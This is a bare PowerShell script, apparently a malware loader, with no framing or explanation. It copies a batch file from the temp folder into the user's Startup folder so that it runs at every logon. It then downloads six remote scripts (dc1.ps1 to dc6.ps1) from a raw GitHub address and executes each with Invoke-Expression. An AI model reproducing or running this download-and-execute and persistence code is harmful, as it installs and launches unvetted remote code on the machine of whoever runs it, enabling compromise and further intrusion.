$TempBat = "$env:TEMP\run.bat"
$Startup = [Environment]::GetFolderPath("Startup")

Copy-Item $TempBat -Destination $Startup -Force

for ($i = 1; $i -le 6; $i++) {
   
    $url = "https://raw.githubusercontent.com/jia891/myweb/refs/heads/main/dc$i.ps1"
    
    
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($url)
    
    
    Invoke-Expression $scriptContent
}
